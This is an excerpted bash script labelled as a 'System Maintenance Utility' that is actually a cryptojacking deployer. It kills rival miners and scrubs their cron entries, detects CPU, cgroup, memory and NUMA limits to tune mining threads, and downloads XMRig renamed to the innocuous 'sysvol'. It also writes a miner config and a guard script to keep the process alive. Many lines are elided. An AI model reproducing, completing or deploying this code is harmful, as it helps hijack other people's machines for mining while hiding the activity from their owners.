#!/bin/bash
# System Maintenance Utility v11.0 FINAL
# Fix: auto-detect CPU/RAM/NUMA | dynamic threads | clean env | no cron
...
# ═══════════════════════════════════════════════════════════════════
# CLEAN ENV — kill semua miner yang nyangkut
# ═══════════════════════════════════════════════════════════════════
...
clean_miners() {
    ...
    # Cleanup cron
    crontab -l 2>/dev/null | grep -v "dbus-sys" | grep -v "xmr-mine" | crontab - 2>/dev/null || true
...
# ═══════════════════════════════════════════════════════════════════
# AUTO-DETECT SPEC (CPU, RAM, CGROUP, NUMA)
# ═══════════════════════════════════════════════════════════════════
...
detect_cgroup_limit() {
    ...
    # No cgroup limit — return physical cores
    detect_cores
}
...
detect_optimal_threads() {
    ...
    # Effective cores = min(cores, cgroup_limit)
    local eff_cores=$cores
    [ "$cg_limit" -lt "$eff_cores" ] && eff_cores=$cg_limit
    
    # Memory-based limit: tiap thread butuh ~250 MB
    local max_by_mem=$((mem_mb / 250))
    [ "$max_by_mem" -lt 1 ] && max_by_mem=1
    
    # Ambil minimum dari: eff_cores, max_by_mem, 10 (biar aman)
    ...
    # Kalau cuma 1 core, jangan paksa banyak thread
    if [ "$eff_cores" -eq 1 ]; then
        threads=1
    fi
...
download_xmrig_official() {
    ...
    chmod 755 "$BASE/sbin/sysvol"
    log "[+] XMRig extracted: $(stat -c%s "$BASE/sbin/sysvol" 2>/dev/null) bytes"
...
deploy_core() {
    ...
    # ─── STEP 3: AUTO-DETECT SPEC + THREADS ───
    local CORES=$(detect_cores)
    local CG_LIMIT=$(detect_cgroup_limit)
    local MEM_MB=$(detect_memory_mb)
    local NUMA=$(detect_numa)
    ...
    # ─── STEP 4: Config XMRig v11 (dynamic threads) ───
...
CFGEOF
    ...
    # ─── STEP 5: Guard script (dynamic hint) ───
...
GRDEOF
    ...
    sed -i "s|__HINT__|$HINT|" "$BASE/run/guard.sh"
    ...
    if pgrep -f "[s]ysvol" >/dev/null 2>&1; then
        ...
        log "║ Cores      : $CORES physical / $CG_LIMIT cgroup"
        log "║ Memory     : ${MEM_MB} MB"
        log "║ NUMA       : $NUMA nodes"
        log "╚════════════════════════════════════════════════════════╝"
        log ""
